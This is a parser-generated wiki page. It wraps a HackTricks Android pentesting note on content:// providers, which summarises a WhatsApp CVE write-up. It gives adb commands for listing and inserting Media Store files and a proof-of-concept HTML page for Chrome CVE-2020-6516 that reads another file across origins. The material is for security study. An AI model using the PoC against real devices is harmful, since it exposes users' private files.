---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Content Protocol in Android

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-mobile-pentesting-android-app-pentesting-content-protocol` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/mobile-pentesting/android-app-pentesting/content-protocol.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Content Protocol in Android](../../topics/mobile-pentesting/content-protocol-in-android.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-mobile-pentesting-android-app-pentesting-content-protocol |
| name | Content Protocol in Android |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/mobile-pentesting/android-app-pentesting/content-protocol.md |

## Preserved Source Material

````yaml
_body: "# Content Protocol in Android\n\n{{#include ../../banners/hacktricks-training.md}}\n\n\n**This is a summary of the\
  \ post [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**\n\
  \n### Listing Files in Media Store\n\nTo list files managed by the Media Store, the command below can be used:\n\n```bash\n\
  $ content query --uri content://media/external/file\n```\n\nFor a more human-friendly output, displaying only the identifier\
  \ and path of each indexed file:\n\n```bash\n$ content query --uri content://media/external/file --projection _id,_data\n\
  ```\n\nContent providers are isolated in their own private namespace. Access to a provider requires the specific `content://`\
  \ URI. Information about the paths for accessing a provider can be obtained from application manifests or the Android framework's\
  \ source code.\n\n### Chrome's Access to Content Providers\n\nChrome on Android can access content providers through the\
  \ `content://` scheme, allowing it to access resources like photos or documents exported by third-party applications. To\
  \ illustrate this, a file can be inserted into the Media Store and then accessed via Chrome:\n\nInsert a custom entry into\
  \ the Media Store:\n\n```bash\ncd /sdcard\necho \"Hello, world!\" > test.txt\ncontent insert --uri content://media/external/file\
  \ \\\n    --bind _data:s:/storage/emulated/0/test.txt \\\n    --bind mime_type:s:text/plain\n```\n\nDiscover the identifier\
  \ of the newly inserted file:\n\n```bash\ncontent query --uri content://media/external/file \\\n    --projection _id,_data\
  \ | grep test.txt\n# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt\n```\n\nThe file can then be viewed in\
  \ Chrome using a URL constructed with the file's identifier.\n\nFor instance, to list files related to a specific application:\n\
  \n```bash\ncontent query --uri content://media/external/file --projection _id,_data | grep -i <app_name>\n```\n\n### Chrome\
  \ CVE-2020-6516: Same-Origin-Policy Bypass\n\nThe _Same Origin Policy_ (SOP) is a security protocol in browsers that restricts\
  \ web pages from interacting with resources from different origins unless explicitly allowed by a Cross-Origin-Resource-Sharing\
  \ (CORS) policy. This policy aims to prevent information leaks and cross-site request forgery. Chrome considers `content://`\
  \ as a local scheme, implying stricter SOP rules, where each local scheme URL is treated as a separate origin.\n\nHowever,\
  \ CVE-2020-6516 was a vulnerability in Chrome that allowed a bypass of SOP rules for resources loaded via a `content://`\
  \ URL. In effect, JavaScript code from a `content://` URL could access other resources loaded via `content://` URLs, which\
  \ was a significant security concern, especially on Android devices running versions earlier than Android 10, where scoped\
  \ storage was not implemented.\n\nThe proof-of-concept below demonstrates this vulnerability, where an HTML document, after\
  \ being uploaded under **/sdcard** and added to the Media Store, uses `XMLHttpRequest` in its JavaScript to access and display\
  \ the contents of another file in the Media Store, bypassing the SOP rules.\n\nProof-of-Concept HTML:\n\n```xml\n<html>\n\
  <head>\n    <title>PoC</title>\n    <script type=\"text/javascript\">\n        function poc()\n        {\n            var\
  \ xhr = new XMLHttpRequest();\n\n            xhr.onreadystatechange = function()\n            {\n                if(this.readyState\
  \ == 4)\n                {\n                    if(this.status == 200 || this.status == 0)\n                    {\n    \
  \                    alert(xhr.response);\n                    }\n                }\n            }\n\n            xhr.open(\"\
  GET\", \"content://media/external/file/747\");\n            xhr.send();\n        }\n    </script>\n</head>\n<body onload=\"\
  poc()\"></body>\n</html>\n```\n\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: mobile-pentesting/android-app-pentesting/content-protocol.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/mobile-pentesting/android-app-pentesting/content-protocol.md
````
